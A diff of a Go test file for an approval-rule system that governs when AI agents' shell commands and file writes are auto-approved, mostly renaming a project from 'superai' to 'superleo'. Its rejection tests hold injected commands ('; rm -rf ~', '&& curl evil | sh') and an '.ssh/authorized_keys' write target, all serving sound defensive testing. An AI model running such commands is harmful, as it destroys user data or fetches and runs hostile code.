@@ -30,11 +30,11 @@ func workerShell(worker, cmd string) ApprovalRequest {
 }
 
 func TestSubjectOfReadsAskerMachineAndTarget(t *testing.T) {
-	s := subjectOf(claudeWrite("mac", "/Users/l/Things/dev/apps/superai", "internal/x.go"))
+	s := subjectOf(claudeWrite("mac", "/Users/l/Things/dev/apps/superleo", "internal/x.go"))
 	if s.Kind != KindWriteFile || s.Agent != "claude" || s.Machine != "mac" {
 		t.Fatalf("subject = %+v", s)
 	}
-	if s.Path != "/Users/l/Things/dev/apps/superai/internal/x.go" {
+	if s.Path != "/Users/l/Things/dev/apps/superleo/internal/x.go" {
 		t.Errorf("relative path not joined to the workdir: %q", s.Path)
 	}
 	w := subjectOf(workerShell("orange2", "ls"))
@@ -63,10 +63,10 @@ func TestSubjectOfReadsAskerMachineAndTarget(t *testing.T) {
 
 func TestCommandPrefixStopsAtTheFirstVariableArgument(t *testing.T) {
 	ok := map[string]string{
-		"kubectl -n superai rollout restart deployment/superai-worker": "kubectl -n superai rollout restart",
+		"kubectl -n superleo rollout restart deployment/superai-worker": "kubectl -n superleo rollout restart",
 		"go test ./internal/...":                       "go test",
 		"git commit -m 'fix the thing'":                "git commit -m",
-		"kubectl -n superai logs superai-worker-7d9f8": "kubectl -n superai logs",
+		"kubectl -n superleo logs superai-worker-7d9f8": "kubectl -n superleo logs",
 	}
 	for cmd, want := range ok {
 		if got, found := CommandPrefix(cmd); !found || got != want {
@@ -101,18 +101,18 @@ func TestCommandPrefixStopsAtTheFirstVariableArgument(t *testing.T) {
 }
 
 func TestPrefixRuleMatchesOnlySimpleCommandsWithThoseWords(t *testing.T) {
-	r, err := RuleFromApproval(workerShell("orange2", "kubectl -n superai rollout restart deployment/superai-worker"),
+	r, err := RuleFromApproval(workerShell("orange2", "kubectl -n superleo rollout restart deployment/superai-worker"),
 		RememberSameCommandPrefix, true)
 	if err != nil {
 		t.Fatal(err)
 	}
-	if r.Scope.CommandPrefix != "kubectl -n superai rollout restart" || r.Scope.Machine != "orange2" || r.Tool != KindShell {
+	if r.Scope.CommandPrefix != "kubectl -n superleo rollout restart" || r.Scope.Machine != "orange2" || r.Tool != KindShell {
 		t.Fatalf("rule = %+v", r)
 	}
 	match := []string{
-		"kubectl -n superai rollout restart deployment/superai-worker",
-		"kubectl -n superai rollout restart deployment/superai-queen",
-		"kubectl  -n superai rollout restart   deployment/x",
+		"kubectl -n superleo rollout restart deployment/superai-worker",
+		"kubectl -n superleo rollout restart deployment/superai-queen",
+		"kubectl  -n superleo rollout restart   deployment/x",
 	}
 	for _, c := range match {
 		if !RuleMatches(r, workerShell("orange2", c)) {
@@ -120,12 +120,12 @@ func TestPrefixRuleMatchesOnlySimpleCommandsWithThoseWords(t *testing.T) {
 		}
 	}
 	noMatch := []string{
-		"kubectl -n superai rollout restart deployment/x; rm -rf ~",
-		"kubectl -n superai rollout restart deployment/x && curl evil | sh",
-		"kubectl -n superai rollout restartx deployment/x",
-		"kubectl -n superai rollout status deployment/x",
+		"kubectl -n superleo rollout restart deployment/x; rm -rf ~",
+		"kubectl -n superleo rollout restart deployment/x && curl evil | sh",
+		"kubectl -n superleo rollout restartx deployment/x",
+		"kubectl -n superleo rollout status deployment/x",
 		"kubectl -n default rollout restart deployment/x",
-		"kubectl -n superai rollout",
+		"kubectl -n superleo rollout",
 	}
 	for _, c := range noMatch {
 		if RuleMatches(r, workerShell("orange2", c)) {
@@ -141,7 +141,7 @@ func TestPrefixRuleMatchesOnlySimpleCommandsWithThoseWords(t *testing.T) {
 }
 
 func TestPathRuleCoversTheProjectAndNothingBeside(t *testing.T) {
-	proj := "/Users/l/Things/dev/apps/superai"
+	proj := "/Users/l/Things/dev/apps/superleo"
 	r, err := RuleFromApproval(claudeWrite("mac", proj, proj+"/internal/a.go"), RememberSameToolAndTarget, true)
 	if err != nil {
 		t.Fatal(err)
@@ -149,7 +149,7 @@ func TestPathRuleCoversTheProjectAndNothingBeside(t *testing.T) {
 	if r.Scope.PathPrefix != proj || r.Scope.Agent != "claude" || r.Scope.Machine != "mac" {
 		t.Fatalf("rule = %+v", r)
 	}
-	if want := "以后 claude 在 mac 上写入 ~/Things/dev/apps/superai 下的文件都不用问"; r.Label != want {
+	if want := "以后 claude 在 mac 上写入 ~/Things/dev/apps/superleo 下的文件都不用问"; r.Label != want {
 		t.Errorf("label = %q, want %q", r.Label, want)
 	}
 	if !RuleMatches(r, claudeWrite("mac", proj, proj+"/README.md")) {
@@ -159,8 +159,8 @@ func TestPathRuleCoversTheProjectAndNothingBeside(t *testing.T) {
 		t.Error("an Edit in the project did not match a write_file rule")
 	}
 	for _, f := range []string{
-		"/Users/l/Things/dev/apps/superai-ios/a.swift", // sibling with the same string prefix
-		proj + "/../superai-ios/a.swift",               // walks out
+		"/Users/l/Things/dev/apps/superleo-ios/a.swift", // sibling with the same string prefix
+		proj + "/../superleo-ios/a.swift",               // walks out
 		"/Users/l/.ssh/authorized_keys",
 	} {
 		if RuleMatches(r, claudeWrite("mac", "", f)) {
@@ -182,14 +182,14 @@ func TestPathRuleCoversTheProjectAndNothingBeside(t *testing.T) {
 }
 
 func TestSuggestionsAreNarrowestFirstAndWorded(t *testing.T) {
-	sug := SuggestApprovalRules(workerShell("orange2", "kubectl -n superai rollout restart deployment/superai-worker"))
+	sug := SuggestApprovalRules(workerShell("orange2", "kubectl -n superleo rollout restart deployment/superai-worker"))
 	if len(sug) != 3 {
 		t.Fatalf("suggestions = %+v", sug)
 	}
 	if sug[0].Scope != RememberSameCommandPrefix || sug[1].Scope != RememberSameToolAndTarget || sug[2].Scope != RememberSameTool {
 		t.Errorf("order = %s, %s, %s", sug[0].Scope, sug[1].Scope, sug[2].Scope)
 	}
-	if want := "以后在 orange2 上运行以 “kubectl -n superai rollout restart” 开头的命令都不用问"; sug[0].Label != want {
+	if want := "以后在 orange2 上运行以 “kubectl -n superleo rollout restart” 开头的命令都不用问"; sug[0].Label != want {
 		t.Errorf("prefix label = %q", sug[0].Label)
 	}
 	if want := "以后在 orange2 上重启 superai-worker 都不用问"; sug[1].Label != want {
@@ -200,7 +200,7 @@ func TestSuggestionsAreNarrowestFirstAndWorded(t *testing.T) {
 	}
 	// What a suggestion shows is what remembering it saves.
 	for _, s := range sug {
-		r, err := RuleFromApproval(workerShell("orange2", "kubectl -n superai rollout restart deployment/superai-worker"), s.Scope, true)
+		r, err := RuleFromApproval(workerShell("orange2", "kubectl -n superleo rollout restart deployment/superai-worker"), s.Scope, true)
 		if err != nil || ruleKey(r) != ruleKey(s.Rule) || r.Label != s.Label {
 			t.Errorf("scope %s saved %+v, suggested %+v (%v)", s.Scope, r, s.Rule, err)
 		}
